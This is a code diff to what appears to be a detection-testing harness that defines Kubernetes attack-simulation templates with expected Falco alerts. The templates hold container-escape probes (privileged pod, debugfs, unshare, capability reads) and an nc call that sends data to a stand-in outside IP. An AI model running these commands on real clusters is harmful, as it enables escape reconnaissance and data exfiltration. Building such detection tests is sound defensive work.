@@ -228,12 +228,12 @@ TEMPLATES: list[dict[str, Any]] = [
         "pod_name": "worker-task-3d55",
         "pod_spec": _pod_spec("worker-task-3d55", privileged=True),
         "command": (
-            "apk add --no-cache e2fsprogs >/dev/null 2>&1; "
-            "debugfs -h >/dev/null 2>&1; "
+            "command -v debugfs || true; "
+            "unshare -m -p -f /bin/sh -c true; "
             "grep Cap /proc/self/status; "
-            "unshare -m -p -f /bin/sh -c true"
+            "nc -z -w 1 10.96.0.10 53 || true"
         ),
-        "sleep_after": 9,
+        "sleep_after": 7,
         "expected_cpu_profile": "low",
         "expect_falco": ["Interactive Shell Spawned in Non-Debug Container"],
         "expect_verbs": ["create", "get"],
@@ -308,9 +308,9 @@ TEMPLATES: list[dict[str, Any]] = [
         "app": "database",
         "mode": "exec",
         "command": (
-            "dd if=/dev/urandom of=/tmp/u.log bs=1M count=48 2>/dev/null; "
-            "gzip -f /tmp/u.log; rm -f /tmp/u.log.gz /tmp/u.log; "
-            "nc -z -w 1 10.96.0.1 8080 || true; sleep 12"
+            "dd if=/dev/urandom of=/tmp/u.log bs=1M count=16 2>/dev/null; "
+            "gzip -f /tmp/u.log; rm -f /tmp/u.log; "
+            "echo p | nc -u -w 1 198.51.100.22 8080 || true; sleep 18"
         ),
         "sleep_after": 2,
         "expected_cpu_profile": "burst",
